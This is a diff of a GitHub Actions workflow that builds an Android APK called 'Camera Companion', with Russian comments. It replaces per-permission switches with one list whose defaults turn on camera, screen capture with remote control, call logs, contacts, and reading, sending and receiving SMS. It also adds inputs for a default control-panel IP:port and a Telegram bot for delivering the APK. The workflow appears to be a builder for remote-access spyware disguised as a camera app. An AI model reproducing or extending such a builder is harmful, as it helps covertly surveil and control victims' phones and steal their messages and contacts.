@@ -24,26 +24,10 @@ on:
         description: "Адрес панели по умолчанию (IP:порт), необязательно"
         required: false
         default: ""
-      camera_permission:
-        description: "Включить разрешение камеры (true/false)"
+      permissions:
+        description: "Список разрешений через запятую: CAMERA,RECORD_AUDIO,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN,LOCATION,MEDIA_IMAGES,MEDIA_VIDEO,CALENDAR"
         required: false
-        default: "true"
-      mic_permission:
-        description: "Включить разрешение микрофона (true/false)"
-        required: false
-        default: "false"
-      screen_permission:
-        description: "Включить экран и удалённое управление (true/false)"
-        required: false
-        default: "true"
-      notifications_permission:
-        description: "Включить разрешение уведомлений (true/false)"
-        required: false
-        default: "true"
-      phone_permission:
-        description: "Включить звонки и телефон (READ_PHONE_STATE, READ_CALL_LOG, CALL_PHONE)"
-        required: false
-        default: "true"
+        default: "CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN"
       tg_token:
         description: "Telegram Bot Token (APK отправится в Telegram после сборки)"
         required: false
@@ -81,45 +65,63 @@ jobs:
 
       - name: Inject build parameters
         run: |
-          APP_NAME="${{ github.event.inputs.app_name }}"
-          APP_ID="${{ github.event.inputs.application_id }}"
+          APP_NAME="${{ github.event.inputs.app_name || 'Camera Companion' }}"
+          APP_ID="${{ github.event.inputs.application_id || 'com.artem.cameracompanion' }}"
           SERVER="${{ github.event.inputs.default_server }}"
-          CAM="${{ github.event.inputs.camera_permission || 'true' }}"
-          MIC="${{ github.event.inputs.mic_permission || 'false' }}"
-          SCREEN="${{ github.event.inputs.screen_permission || 'true' }}"
-          NOTIF="${{ github.event.inputs.notifications_permission || 'true' }}"
-          PHONE="${{ github.event.inputs.phone_permission || 'true' }}"
+          PERMS="${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}"
+
           cat > build.properties.generated <<EOF
-          ARP_APP_NAME=${APP_NAME:-Camera Companion}
-          ARP_APPLICATION_ID=${APP_ID:-com.artem.cameracompanion}
+          ARP_APP_NAME=${APP_NAME}
+          ARP_APPLICATION_ID=${APP_ID}
           ARP_DEFAULT_SERVER=${SERVER}
           EOF
+
+          # Проверка наличия разрешения в списке
+          has_perm() { echo ",$PERMS," | grep -qF ",$1,"; }
+          # Удалить маркерный блок из манифеста
+          remove_block() { sed -i "/<!--${1}-->/,/<!--${2}-->/d" app/src/main/AndroidManifest.xml; }
+
           MANIFEST="app/src/main/AndroidManifest.xml"
-          if [ "$CAM" != "true" ]; then
-            sed -i '/android\.permission\.CAMERA/d' "$MANIFEST"
-            sed -i '/FOREGROUND_SERVICE_CAMERA/d' "$MANIFEST"
+
+          # Разрешения без маркерных блоков
+          has_perm "CAMERA"       || { sed -i '/android\.permission\.CAMERA/d' "$MANIFEST"; sed -i '/FOREGROUND_SERVICE_CAMERA/d' "$MANIFEST"; }
+          has_perm "RECORD_AUDIO" || { sed -i '/android\.permission\.RECORD_AUDIO/d' "$MANIFEST"; sed -i '/FOREGROUND_SERVICE_MICROPHONE/d' "$MANIFEST"; }
+          has_perm "NOTIFICATIONS" || sed -i '/POST_NOTIFICATIONS/d' "$MANIFEST"
+          has_perm "SCREEN"       || { sed -i '/FOREGROUND_SERVICE_MEDIA_PROJECTION/d' "$MANIFEST"; remove_block "CONTROL_SERVICE_START" "CONTROL_SERVICE_END"; }
+
+          # Разрешения с маркерными блоками
+          has_perm "PHONE_STATE"  || remove_block "PHONE_STATE_PERM_START"   "PHONE_STATE_PERM_END"
+          has_perm "CALL_LOG"     || remove_block "CALL_LOG_PERM_START"      "CALL_LOG_PERM_END"
+          has_perm "CALL_PHONE"   || remove_block "CALL_PHONE_PERM_START"    "CALL_PHONE_PERM_END"
+          has_perm "CONTACTS"     || remove_block "CONTACTS_PERM_START"      "CONTACTS_PERM_END"
+          has_perm "READ_SMS"     || remove_block "READ_SMS_PERM_START"      "READ_SMS_PERM_END"
+          has_perm "SEND_SMS"     || remove_block "SEND_SMS_PERM_START"      "SEND_SMS_PERM_END"
+          has_perm "RECEIVE_SMS"  || remove_block "RECEIVE_SMS_PERM_START"   "RECEIVE_SMS_PERM_END"
+          has_perm "BT_CONNECT"   || remove_block "BT_CONNECT_PERM_START"    "BT_CONNECT_PERM_END"
+          has_perm "BT_SCAN"      || remove_block "BT_SCAN_PERM_START"       "BT_SCAN_PERM_END"
+          has_perm "LOCATION"     || remove_block "LOCATION_PERM_START"      "LOCATION_PERM_END"
+          has_perm "MEDIA_IMAGES" || remove_block "MEDIA_IMG_PERM_START"     "MEDIA_IMG_PERM_END"
+          has_perm "MEDIA_VIDEO"  || remove_block "MEDIA_VID_PERM_START"     "MEDIA_VID_PERM_END"
+          has_perm "CALENDAR"     || remove_block "CALENDAR_PERM_START"      "CALENDAR_PERM_END"
+
+          # Легаси-разрешение для медиа (Android ≤12): убрать если оба медиа не выбраны
+          if ! has_perm "MEDIA_IMAGES" && ! has_perm "MEDIA_VIDEO"; then
+            remove_block "MEDIA_LEGACY_PERM_START" "MEDIA_LEGACY_PERM_END"
           fi
-          if [ "$MIC" != "true" ]; then
-            sed -i '/android\.permission\.RECORD_AUDIO/d' "$MANIFEST"
-            sed -i '/FOREGROUND_SERVICE_MICROPHONE/d' "$MANIFEST"
-          fi
-          if [ "$SCREEN" != "true" ]; then
-            sed -i '/FOREGROUND_SERVICE_MEDIA_PROJECTION/d' "$MANIFEST"
-            sed -i '/<!--CONTROL_SERVICE_START-->/,/<!--CONTROL_SERVICE_END-->/d' "$MANIFEST"
-          fi
-          if [ "$NOTIF" != "true" ]; then
-            sed -i '/POST_NOTIFICATIONS/d' "$MANIFEST"
-          fi
+
+          # foregroundServiceType
           FST=""
-          [ "$SCREEN" = "true" ] && FST="mediaProjection"
-          [ "$CAM" = "true" ] && FST="${FST:+$FST|}camera"
-          [ "$MIC" = "true" ] && FST="${FST:+$FST|}microphone"
+          has_perm "SCREEN"       && FST="mediaProjection"
+          has_perm "CAMERA"       && FST="${FST:+$FST|}camera"
+          has_perm "RECORD_AUDIO" && FST="${FST:+$FST|}microphone"
           if [ -n "$FST" ]; then
             sed -i "s/android:foregroundServiceType=\"[^\"]*\"/android:foregroundServiceType=\"$FST\"/" "$MANIFEST"
           else
             sed -i '/android:foregroundServiceType/d' "$MANIFEST"
           fi
-          echo "Manifest permissions: CAM=$CAM MIC=$MIC SCREEN=$SCREEN NOTIF=$NOTIF PHONE=$PHONE FST=${FST:-none}"
+
+          echo "=== Permissions in build: $PERMS ==="
+          echo "=== Manifest uses-permission lines ==="
           grep 'uses-permission\|foregroundService' "$MANIFEST" || true
 
       - name: Build debug APK
